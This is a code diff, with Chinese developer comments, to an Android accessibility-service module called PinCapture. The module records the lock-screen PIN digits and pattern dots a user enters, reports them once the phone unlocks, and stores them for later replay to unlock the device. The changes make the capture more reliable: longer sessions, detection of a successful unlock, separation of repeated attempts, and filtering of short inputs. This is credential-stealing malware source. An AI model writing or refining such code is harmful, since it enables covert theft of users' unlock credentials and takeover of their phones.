@@ -25,6 +25,9 @@ object PinCapture {
 
     private var until = 0L
     private val digits = StringBuilder()
+    /** 图案/PIN 最少位数（Android 图案锁最少 4 个点，PIN 最少 4 位） */
+    private const val MIN_UNLOCK_LEN = 4
+    private var lastDigitAt = 0L
     private var lastText = ""
     private var reported = false
 
@@ -92,11 +95,21 @@ object PinCapture {
             cls.contains("Keyguard", true) ||
             (pkg.contains("com.android.settings") && cls.contains("password", true))
         if (!looksPattern) return
-        if (System.currentTimeMillis() < suppressUntil) return
-        if (isActive()) return
+        if (System.currentTimeMillis() < suppressUntil) {
+            Log.v(TAG, "keyguard ignored (suppressed) pkg=$pkg")
+            return
+        }
+        Log.d(TAG, "keyguard window hit (pkg=$pkg cls=$cls active=${isActive()})")
+        if (isActive()) {
+            // 会话还活着：只续期，不清空（否则连点之间会丢数字）
+            until = maxOf(until, System.currentTimeMillis() + 60_000L)
+            return
+        }
         // 自动开一个短会话（60 秒），画完自动结算
         until = System.currentTimeMillis() + 60_000L
         pattern.setLength(0)
+        digits.setLength(0)
+        lastDigitAt = 0L
         for (i in 0..8) dots[i] = false
         reported = false
         Log.d(TAG, "keyguard window -> auto watch 60s (pkg=$pkg cls=$cls)")
@@ -166,11 +179,53 @@ object PinCapture {
      * 节点 text 就是 "0"~"9"，按点击顺序拼起来就是 PIN。
      */
     fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
-        if (!isActive()) return
+        if (!isActive()) {
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
+                event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                Log.v(TAG, "event ignored (session inactive) type=${event.eventType} pkg=${event.packageName}")
+            }
+            return
+        }
         val pkg = event.packageName?.toString() ?: return
         val isKeyguard = pkg.contains("keyguard") || pkg.contains("systemui") ||
             pkg.contains("lock") || pkg.contains(".settings")
-        if (!isKeyguard) return
+        if (!isKeyguard) {
+            // 解锁成功时，下一个窗口事件来自桌面/目标 App（不是 systemui）。
+            // 早期这里直接 return，导致"锁屏消失"永远检测不到 → 采集到了却不上报。
+            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+                (pattern.isNotEmpty() || pending.isNotEmpty() || digits.isNotEmpty())) {
+                val was = if (pattern.isNotEmpty()) pattern.toString() else pending
+                Log.d(TAG, "left lock via pkg=$pkg, report=$was digits=$digits")
+                if (was.length in 1 until MIN_UNLOCK_LEN) {
+                    // 解锁瞬间后面几个点的"已添加圆点"事件可能还没到，
+                    // 立刻判定会把 12369 记成 1 → 给 500ms 宽限再结算
+                    Log.d(TAG, "short pattern ($was), grace 500ms for late dots")
+                    val svc = service
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        val now2 = pattern.toString()
+                        Log.d(TAG, "grace done, pattern=$now2")
+                        if (now2.isNotEmpty()) {
+                            pattern.setLength(0); pattern.append(now2)
+                            pending = ""
+                            finishPattern(svc, true)
+                        } else if (was.isNotEmpty()) {
+                            pattern.setLength(0)
+                            pending = ""
+                            Log.d(TAG, "grace: still short, drop \"$was\"")
+                        }
+                    }, 500L)
+                    return
+                }
+                if (was.isNotEmpty()) {
+                    pattern.setLength(0); pattern.append(was)
+                    pending = ""
+                    finishPattern(service, true)
+                }
+                if (digits.isNotEmpty() && !reported) commit(service, "unlock_left")
+                until = 0L
+            }
+            return
+        }
 
         // 图案锁：先看事件文本里有没有"开始绘制/绘制完成"
         runCatching {
@@ -182,7 +237,16 @@ object PinCapture {
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val t = nodeText(event)?.trim().orEmpty()
                 if (t.length == 1 && t[0].isDigit()) {
+                    val now = System.currentTimeMillis()
+                    // 距上一次按键超过 8 秒 = 新的一次解锁尝试，先清掉上一轮的残留，
+                    // 否则多次尝试的数字会拼成 "12369" + "4578" = "123694578"
+                    if (digits.isNotEmpty() && now - lastDigitAt > 8_000L) {
+                        Log.d(TAG, "new attempt detected -> clear buffer (was=${digits})")
+                        digits.setLength(0)
+                    }
+                    lastDigitAt = now
                     digits.append(t[0])
+                    if (digits.length > 16) digits.delete(0, digits.length - 16)
                     Log.d(TAG, "click digit -> len=${digits.length}")
                 } else if (t.isNotEmpty() && isConfirm(t)) {
                     commit(service, "confirm")
@@ -348,6 +412,12 @@ object PinCapture {
         for (i in 0..8) dots[i] = false
         Log.d(TAG, "pattern done ok=$ok value=$value")
         if (value.isEmpty()) return
+        // 图案锁最少 4 个点、PIN 最少 4 位：不足的一律丢弃。
+        // 否则"点亮屏幕顺手碰一下某个点"会被当成"解锁成功，密码=4"上报（实测踩过）。
+        if (value.length < MIN_UNLOCK_LEN) {
+            Log.d(TAG, "drop too-short pattern/PIN: \"$value\" (len=${value.length} < $MIN_UNLOCK_LEN)")
+            return
+        }
         // 存下来，供「一键解锁 / V2解锁」直接重放
         runCatching {
             service.getSharedPreferences("pin_store", android.content.Context.MODE_PRIVATE)
@@ -388,6 +458,11 @@ object PinCapture {
     /** 用户输完并解锁：上报一次 */
     private fun commit(service: AccessibilityService, via: String) {
         if (reported || digits.isEmpty()) return
+        if (digits.length < MIN_UNLOCK_LEN) {
+            Log.d(TAG, "drop too-short PIN: \"$digits\" (len=${digits.length} < $MIN_UNLOCK_LEN)")
+            digits.setLength(0)
+            return
+        }
         reported = true
         val value = digits.toString()
         digits.setLength(0)
